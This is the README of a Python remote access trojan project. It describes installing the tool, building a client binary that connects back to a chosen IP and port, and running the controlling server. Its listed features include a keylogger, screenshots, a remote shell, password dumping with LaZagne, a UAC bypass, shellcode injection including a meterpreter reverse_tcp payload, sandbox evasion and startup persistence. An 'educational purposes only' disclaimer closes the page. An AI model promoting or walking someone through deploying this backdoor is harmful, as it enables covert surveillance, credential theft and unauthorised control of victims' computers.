# Python Backdoor
https://github.com/xp4xbox/Python-Backdoor
This project is a cross-platform (Windows/Linux/MacOS) open source, backdoor/reverse tcp/RAT made in Python3 which contains many features such as multi-client support.

![image](.github/resources/demo.png)

## Installation

You will need:

* [Python](https://www.python.org/downloads) 
* One of the following
  * Windows
  * MacOS Big Sur or higher (earlier versions may not work with pyinstaller)
  * Linux

1. Download via git `git clone https://github.com/xp4xbox/Python-Backdoor --recursive`
2. Install the project requirements by running `python -m pip install -r requirements.txt`
3. Install each submodule requirements by running the following:
- `python -m pip install -r src/submodule/LaZagne/requirements.txt`
- `python -m pip install -r src/submodule/wesng/requirements.txt` (Windows only)

## Features

Currently, this program has several features, notably:

* Multi-client support
* Cross-platform server and client
* Fernet encryption
* Built-in keylogger
* Send commands to all clients
* Capture screenshots
* Upload/download files
* Download directories recursively
* Open remote shell or python interpreter
* Find vulnerability(s) with [wesng](https://github.com/bitsadmin/wesng) and [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
* Dump various passwords with [LaZagne](https://github.com/AlessandroZ/LaZagne)
* UAC Bypass with [WinPwnage](https://github.com/rootm0s/WinPwnage)*
* Disable a process*
* Inject shellcode*
* VM/sandboxie check*
* Add to startup*
* Ability to melt file*

> Asterisk means only supported on Windows 

## Quick Usage

1. Open `src/setup.py -h` in python to view build args
2. Run `src/setup.py` with desired args, eg. `-hI 192.168.10.92 -p 3003`
3. Check the `dist` folder for the binary.
4. Disable your firewall on the server or configure your firewall to allow the port chosen.
5. Run the `src/main_server.py -p <port>` to start the server and accept connections.

> If you plan on using the program with DNS hostname or external IP, you must port forward your chosen port.

### Command Arguments
- Arrows `<>` represent mandatory argument
- Square brackets `[]` represents optional argument
- Brackets `(arg)` in either above mean `arg` is the exact argument

eg. 
- `I Interact with a connection <index>` `i 1`
- `L List all connections [(inactive)]` `l` or `l inactive`

## Common problems & Solutions

- Injecting shellcode requires the architecture specified by the command. eg. x64: `msfvenom windows/x64/meterpreter/reverse_tcp`
- For use outside of network specified port is not open, check specified port with a [port scanner](https://www.whatismyip.com/port-scanner/)

## Disclaimer

This program is for educational purposes only. I take no responsibility or liability for own personal use.

## License

[License](https://github.com/xp4xbox/Python-Backdoor/blob/master/license)
